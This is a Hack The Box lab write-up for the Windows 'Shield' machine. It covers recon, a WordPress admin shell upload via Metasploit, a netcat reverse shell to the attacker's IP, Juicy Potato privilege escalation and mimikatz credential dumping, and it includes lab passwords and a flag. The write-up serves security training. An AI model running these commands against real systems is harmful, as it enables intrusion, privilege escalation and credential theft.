# Shield

## Recon 

- nmap 

```
# nmap -sV -O 10.10.10.29

```

![](./IMG/0.png)


- gobuster parse the web (enumeration the path)

```
# gobuster dirb -u http://10.10.10.29 -w /usr/share/wordlists/dirb/common.txt
```

![](./IMG/1.png)

- Find a path : wordpress 
- we can know there is a wordpress web page on it .

![](./IMG/2.png)

- Browse it 

![](./IMG/3.png)

- Since The WordPress is a blog framework, many blogger will use it to create a simple web page 
- And there are many vulnerability on it.
- We also know the WordPress has design a admin page for blogger to manage there web page which path is /wp-admin
- Try to browse to ```http://10.10.10.29/wordpress/wp-admin``` and it will redirect to ``` http://10.10.10.29/wordpress/wp-login.php?redirect_to=http%3A%2F%2F10.10.10.29%2Fwordpress%2Fwp-admin%2F&reauth=1 ```

![](./IMG/4.png)

- Now the mission is find the password to login to wordpress management console 

- From previous challenge, we find the credential 

```
admin / P@s5w0rd!
```

- Success login 

![](./IMG/5.png)


## Get Shell 

### First Method

- Using the management page to change the php file 
- Appearance > Theme Editor > Twenty Seventeen > 404 Template(404.php)

![](./IMG/6.png)

![](./IMG/7.png)

![](./IMG/8.png)



### Metasploit to get meterpreter

- Find wp_admin_shellupload 
```
# search wp_admin
```

![](./IMG/9.png)

- Check the necessary information 

```
# show options 
```

![](./IMG/10.png)

- set information 
```
# set LHOST <my_ipaddress>
# set PASSWORD P@s5w0rd!
# set RHOSTS 10.10.10.29
# set USERNAME admin
# set TARGETURI /wordpress
```

![](./IMG/11.png)
![](./IMG/12.png)
![](./IMG/13.png)

### Upload the nc to victim server 

- Download the nc executable file 
- [nc executable file](https://github.com/int0x33/nc.exe)
```
# git clone https://github.com/int0x33/nc.exe.git
```
![](./IMG/14.png)

- In meterpreter, change directory on attacker's machine
```
# lcd <target directory on attack machine>
# lcd /home/kali/Desktop/HTB/nc.exe/
```
- Change directory on victim's machine
```
# cd <target directory on victim machine>
# cd C:/inetpub/wwwroot/wordpress/wp-content/uploads
```
- upload nc executable file to remote victim server
```
# upload nc64.exe
```

![](./IMG/15.png)

- Check the uploads directory content 

![](./IMG/16.png)

- Execute the nc on attack machine to listen port 1234
```
# nc -lvnp 1234
```

![](./IMG/17.png)

- In meterpreter, execute the nc file on victim server to connect to the attack's nc 

![](./IMG/18.png)

- The nc on attack machine has been connected from victim then  Check systeminfo 
```
# systeminfo 
```

![](./IMG/19.png)


## Privileged Escalation 
### Juicy Potato

- [juicy potato](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)

![](./IMG/20.png)


- Juicy Potato is a variant of the exploit that allows service accounts on Windows to escalate to SYSTEM (highest privileges) by leveraging the BITS and the SeAssignPrimaryToken or SeImpersonate privilege in a MiTM attack.
- We can exploit this by uploading the Juicy Potato binary and executing it.

### Upload Juicy Potato 

- Using the same step to upload Juicy Potato to victim's machine.
- In attacker's machine, change the juicy-potato's name 
```
# mv JuicyPotato.exe JP.exe
```
- In meterpreter, change directory on attacker's machine
```
# lcd /home/kali/Desktop/HTB/
```
- Change directory on victim's machine
```
# cd C:/inetpub/wwwroot/wordpress/wp-content/uploads
```
- 
- upload nc executable file to remote victim server
```
# upload JP.exe
```

### Create Privilege Shell 

- Create a batch file that will be executed by the exploit(JuicyPotato), and return a SYSTEM shell. 
```
# echo START <victim's nc file location> -e powershell.exe <attacker ip> <attacker port> > <batch file>

# echo START C:/inetpub/wwwroot/wordpress/wp-content/uploads/nc.exe -e powershell.exe 10.10.14.150 1111 > shell.bat
```
![](./IMG/21.png)

- Create another nc listener on attack machine

```
# nc -lvnp 1111
```
![](./IMG/22.png)

- Juicy Potato execute the batch to create PS shell (system permisson )

```
# JP.exe -t * -p C:/inetpub/wwwroot/wordpress/wp-content/uploads/Shell.bat -l 1337
```

![](./IMG/23.png)


### Find Flag 

- From PS shell, find Flag 
```
Location: C:\Users\Administrator\Desktop\root.txt 
```

![](./IMG/24.png)

- Get flag : 6e9a9fdc6f64e410a68b847bb4b404fa

## Post Exploitation 

### Upload mimikaz

- [mimikatz](https://github.com/sebastiendamaye/hackthebox/raw/master/01-starting_point/04-Shield/files/mimikatz.exe)

- Upload mimikatz by the same step before
- In meterpreter, change directory on attacker's machine
```
# lcd /home/kali/Desktop/HTB/
```
- Change directory on victim's machine
```
# cd C:/inetpub/wwwroot/wordpress/wp-content/uploads
``` 
- upload nc executable file to remote victim server
```
# upload mimikatz.exe
```

### Using mimikatz to crack logonpassword

```
#./mimikatz
```

![](./IMG/25.png)

```
# selurlsa::logonpasswords
```
![](./IMG/26.png)

![](./IMG/27.png)

- get another credential 

```
sandra / Password1234!
```


### Recon 2 - Find WordPress Version 

#### Ref 
- [Version Check](https://www.wpbeginner.com/beginners-guide/how-to-easily-check-which-wordpress-version-you-are-using/)

1. Check The Page Source 
2. Find the string - "generator"
3. The WordPress version will display on the value of generator in meta tag

![](./IMG/28.png)

![](./IMG/29.png)



## Reference 

- [Write up 1](https://www.aldeid.com/wiki/HackTheBox-StartingPoint-Shield)
- [Write up 2](https://www.linkedin.com/pulse/hack-box-shield-nathan-barnes/)
- [netcat](https://github.com/int0x33/nc.exe)
- [Juicy Potato](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)
- [Juicy Potato Usage](https://github.com/ohpe/juicy-potato/tree/v0.1)
- [mimikatz](https://github.com/sebastiendamaye/hackthebox/raw/master/01-starting_point/04-Shield/files/mimikatz.exe)


###### tags: `HackTheBox` `Windows`